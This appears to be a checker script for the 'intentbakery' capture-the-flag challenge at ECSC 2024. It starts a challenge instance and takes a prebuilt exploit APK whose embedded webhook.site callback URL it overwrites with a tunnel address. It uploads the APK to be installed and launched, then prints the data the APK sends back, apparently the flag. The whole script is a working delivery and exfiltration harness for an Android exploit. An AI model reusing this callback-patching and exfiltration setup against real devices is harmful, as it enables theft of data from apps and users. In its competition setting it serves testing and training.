#!/usr/bin/env python3

import logging
import os
import time

import instancer
import requests
import tunnel
import urllib3.util

logging.disable()

URL = os.environ.get("URL", "http://intentbakery.challs.jeopardy.ecsc2024.it")
if URL.endswith("/"):
    URL = URL[:-1]

PARSED_URL = urllib3.util.parse_url(URL)

poc_webhook_str = 'https://webhook.site/6f0fa0c7-d1e8-4c9e-8691-e1dd0fe6f62c?i_need_to_make_space_for_checker=please_be_enough'

with open(os.path.join(os.path.dirname(__file__), "poc.apk"), "rb") as f:
    poc_bytes = bytearray(f.read())

with instancer.spawn_instance(PARSED_URL.hostname, secure=True) as i:
    while True:
        r = requests.get(i.endpoints[0].url, verify=False)
        if r.status_code == 500 or r.status_code == 404:
            time.sleep(5)
            continue

        r.raise_for_status()
        assert 'Upload your exploit APK' in r.text
        break

    with tunnel.open_http_tunnel() as t:
        tunnel_url = f'http://{t.remote_host}:{t.remote_port}?a='
        assert len(tunnel_url) <= len(poc_webhook_str)

        webhook_start_idx = poc_bytes.index(poc_webhook_str.encode())
        poc_bytes[webhook_start_idx:webhook_start_idx + len(poc_webhook_str)] = tunnel_url.encode().ljust(
            len(poc_webhook_str), b"b")

        r = requests.post(i.endpoints[0].url, verify=False, files={"file": ('exploit.apk', poc_bytes)})
        r.raise_for_status()
        assert 'APK installed and launched' in r.text

        _, _, _, body = t.wait_request()
        t.send_response(200, {}, b'')

        print(body)
